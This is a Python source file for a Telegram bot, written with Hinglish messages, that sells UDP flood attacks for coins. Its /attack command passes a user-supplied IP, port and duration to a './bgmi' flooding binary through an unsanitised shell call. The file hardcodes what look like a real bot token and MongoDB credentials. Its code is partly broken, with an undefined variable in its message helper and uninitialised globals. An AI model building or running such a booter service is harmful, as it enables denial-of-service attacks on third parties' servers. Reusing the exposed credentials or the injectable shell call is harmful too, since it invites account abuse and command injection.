import asyncio
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from motor.motor_asyncio import AsyncIOMotorClient

# Constants
TELEGRAM_BOT_TOKEN = '7475208485:AAFQQN4JH-heTQGzGQisr02uKRNM97k6kqE'  # Replace with your bot token
ADMIN_USER_ID = 1950356877
MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
DB_NAME = "legxninja"
COLLECTION_NAME = "users"
ATTACK_TIME_LIMIT = 240  # Maximum attack duration in seconds
COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack

# MongoDB setup
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client[DB_NAME]
users_collection = db[COLLECTION_NAME]

bot_start_time = datetime.now()

# Utility functions
async def get_user(user_id):
    """Fetch user data from MongoDB."""
    user = await users_collection.find_one({"user_id": user_id})
    if not user:
        return {"user_id": user_id, "coins": 0}
    return user

async def update_user(user_id, coins):
    """Update user coins in MongoDB."""
    await users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"coins": coins}},
        upsert=True
    )

async def send_message(chat_id, text, parse_mode='Markdown'):
    """Helper function to send messages."""
    await context.bot.send_message(chat_id=chat_id, text=text, parse_mode=parse_mode)

# Handlers
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*❄️ WELCOME TO @NINJAGAMEROP ULTIMATE UDP FLOODER ❄️*\n\n"
        "*🔥 Yeh bot apko deta hai hacking ke maidan mein asli mazza! 🔥*\n\n"
        "*✨ Key Features: ✨*\n"
        "🚀 *𝘼𝙩𝙩𝙖𝙘𝙠 𝙠𝙖𝙧𝙤 𝙖𝙥𝙣𝙚 𝙤𝙥𝙥𝙤𝙣𝙚𝙣𝙩𝙨 𝙥𝙖𝙧 𝘽𝙜𝙢𝙞 𝙈𝙚 /attack*\n"
        "🏦 *𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙠𝙖 𝙗𝙖𝙡𝙖𝙣𝙘𝙚 𝙖𝙪𝙧 𝙖𝙥𝙥𝙧𝙤𝙫𝙖𝙡 𝙨𝙩𝙖𝙩𝙪𝙨 𝙘𝙝𝙚𝙘𝙠 𝙠𝙖𝙧𝙤 /myinfo*\n"
        "🤡 *𝘼𝙪𝙧 𝙝𝙖𝙘𝙠𝙚𝙧 𝙗𝙖𝙣𝙣𝙚 𝙠𝙚 𝙨𝙖𝙥𝙣𝙤 𝙠𝙤 𝙠𝙖𝙧𝙡𝙤 𝙥𝙤𝙤𝙧𝙖! 😂*\n\n"
        "*⚠️ Kaise Use Kare? ⚠️*\n"
        "*Commands ka use karo aur commands ka pura list dekhne ke liye type karo: /help*\n\n"
        "*💬 Queries or Issues? 💬*\n"
        "*Contact Admin: @NINJAGAMEROP*"
    )
    await send_message(chat_id, message)

async def ninja(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await send_message(chat_id, "*🖕 Chal nikal! Tera aukaat nahi hai yeh command chalane ki. Admin se baat kar pehle.*")
        return

    if len(args) != 3:
        await send_message(chat_id, "*⚠️ Tere ko simple command bhi nahi aati? Chal, sikh le: /ninja <add|rem> <user_id> <coins>*")
        return

    command, target_user_id, coins = args
    coins = int(coins)
    target_user_id = int(target_user_id)

    user = await get_user(target_user_id)

    if command == 'add':
        new_balance = user["coins"] + coins
        await update_user(target_user_id, new_balance)
        await send_message(chat_id, f"*✅ User {target_user_id} ko {coins} coins diye gaye. Balance: {new_balance}.*")
    elif command == 'rem':
        new_balance = max(0, user["coins"] - coins)
        await update_user(target_user_id, new_balance)
        await send_message(chat_id, f"*✅ User {target_user_id} ke {coins} coins kaat diye. Balance: {new_balance}.*")

# Attack handler
async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, attack_end_time

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    user = await get_user(user_id)

    if user["coins"] < COINS_REQUIRED_PER_ATTACK:
        await send_message(chat_id, "*💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂 DM:- @NINJAGAMEROP*")
        return

    if attack_in_progress:
        remaining_time = (attack_end_time - datetime.now()).total_seconds()
        await send_message(chat_id, f"*⚠️ Arre bhai, ruk ja! Ek aur attack chal raha hai. Attack khatam hone mein {int(remaining_time)} seconds bache hain.*")
        return

    if len(args) != 3:
        await send_message(chat_id, "*❌ Usage galat hai! Command ka sahi format yeh hai:*\n*👉 /attack <ip> <port> <duration>*")
        return

    ip, port, duration = args
    port = int(port)
    duration = int(duration)

    # Validate port and duration
    if port in [17500, 20000, 20001, 20002] or (100 <= port <= 999):
        await send_message(chat_id, "*❌ YE PORT WRONG HAI SAHI PORT DALO AUR NAHI PATA TOH YE VIDEO DEKHO ❌*")
        return

    if duration > ATTACK_TIME_LIMIT:
        await send_message(chat_id, f"*⛔ Limit cross mat karo! Tum sirf {ATTACK_TIME_LIMIT} seconds tak attack kar sakte ho.*")
        return

    # Deduct coins
    new_balance = user["coins"] - COINS_REQUIRED_PER_ATTACK
    await update_user(user_id, new_balance)

    attack_in_progress = True
    attack_end_time = datetime.now() + timedelta(seconds=duration)

    await send_message(chat_id, f"*🚀 [ATTACK INITIATED] 🚀*\n\n*💣 Target IP: {ip}*\n*🔢 Port: {port}*\n*🕒 Duration: {duration} seconds*\n*💰 Coins Deducted: {COINS_REQUIRED_PER_ATTACK}*\n*📉 Remaining Balance: {new_balance}*")

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress, attack_end_time
    attack_in_progress = True

    try:
        command = f"./bgmi {ip} {port} {duration} {13} {600}"
        process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")
    except Exception as e:
        await send_message(chat_id, f"*⚠️ Error: {str(e)}*\n*Command failed to execute. Contact admin if needed.*")
    finally:
        attack_in_progress = False
        attack_end_time = None
        await send_message(chat_id, "*✅ [ATTACK FINISHED] ✅*")

# Main function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("ninja", ninja))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()
